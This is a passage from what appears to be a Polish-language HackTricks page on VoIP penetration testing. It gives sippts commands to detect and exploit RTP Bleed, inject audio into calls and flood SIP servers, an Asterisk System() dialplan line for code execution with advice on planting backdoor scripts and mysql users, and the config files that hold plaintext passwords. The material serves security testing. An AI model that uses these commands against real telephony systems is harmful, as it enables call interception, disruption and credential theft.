* **`SIPPTS rtpbleed`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed wykrywa wrażliwość RTP Bleed wysyłając strumienie RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed wykrywa podatność na wyciek RTP, wysyłając strumienie RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Exploit SIPPTS rtpbleedflood wykorzystuje podatność RTP Bleed wysyłając strumienie RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Exploit SIPPTS rtpbleedinject wykorzystuje podatność RTP Bleed wstrzykując plik dźwiękowy (format WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

W Asterisku uda ci się jakoś móc **dodawać reguły rozszerzeń i przeładowywać je** (na przykład poprzez skompromitowanie podatnego serwera menedżera sieciowego), możliwe jest uzyskanie RCE za pomocą polecenia **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Istnieje polecenie o nazwie **`Shell`**, które można użyć **zamiast `System`** do wykonywania poleceń systemowych, jeśli jest to konieczne.

{% hint style="warning" %}
Jeśli serwer **zabrania użycia pewnych znaków** w poleceniu **`System`** (np. w Elastix), sprawdź, czy serwer WWW pozwala **w jakiś sposób tworzyć pliki w systemie** (np. w Elastix lub trixbox), i użyj tego do **utworzenia skryptu backdoor** a następnie użyj **`System`** do **wykonania** tego **skryptu**.
{% endhint %}

#### Interesujące pliki lokalne i uprawnienia

* **`sip.conf`** -> Zawiera hasło użytkowników SIP.
* Jeśli **serwer Asterisk działa jako root**, można skompromitować roota.
* **Użytkownik root mysql** może **nie mieć hasła**.
* Można to wykorzystać do utworzenia nowego użytkownika mysql jako backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Zawiera hasło administratora panelu webowego (FreePBX).
* **`FreePBX.conf`** -> Zawiera hasło użytkownika FreePBXuser używane do dostępu do bazy danych.
* Można to wykorzystać do utworzenia nowego użytkownika mysql jako backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Zawiera kilka haseł w postaci czystego tekstu, takich jak hasło root mysql, hasło IMAPd, hasło administratora webowego
* **Kilka folderów** będzie należeć do skompromitowanego użytkownika asterisk (jeśli nie działa jako root). Ten użytkownik może odczytać wcześniejsze pliki i kontrolować konfigurację, więc może sprawić, że Asterisk załaduje inne zainfekowane binaria podczas wykonywania.

### Wstrzykiwanie RTP

Możliwe jest wstrzyknięcie pliku **`.wav`** w rozmowy za pomocą narzędzi takich jak **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) i **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Lub można użyć skryptów z [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) do **skanowania rozmów** (**`rtpscan.pl`**), wysyłania pliku `.wav` do rozmowy (**`rtpsend.pl`**) i **wstrzykiwania hałasu** w rozmowę (**`rtpflood.pl`**).

### DoS

Istnieje kilka sposobów na próbę przeprowadzenia ataku DoS na serwery VoIP.

* **`SIPPTS flood`** z [**sippts**](https://github.com/Pepelux/sippts)**: Atak flood SIPPTS wysyła nieograniczoną liczbę wiadomości do celu.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** z [**sippts**](https://github.com/Pepelux/sippts)**: Polecenie ping SIPPTS wykonuje ping SIP, aby sprawdzić czas odpowiedzi serwera.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Atak DoS na protokół IAX używany przez Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Narzędzie do przeprowadzania ataku flood wiadomości SIP/SDP INVITE przez UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Wysyła kilka poprawnie sformowanych pakietów RTP. Należy znać używane porty RTP (najpierw sniff).
* [**SIPp**](https://github.com/SIPp/sipp): Pozwala analizować i generować ruch SIP. Może być również używany do ataków DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Szwajcarski scyzoryk SIP. Może być również używany do przeprowadzania ataków SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Luki w systemie operacyjnym

Najprostszym sposobem zainstalowania oprogramowania takiego jak Asterisk jest pobranie **dystrybucji systemu operacyjnego**, która już go zawiera, takiej jak: **FreePBX, Elastix, Trixbox**... Problem z nimi polega na tym, że gdy już działają, administratorzy systemu mogą **nie aktualizować ich ponownie**, a z czasem będą odkrywane **luki w zabezpieczeniach**.

## Odnośniki

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
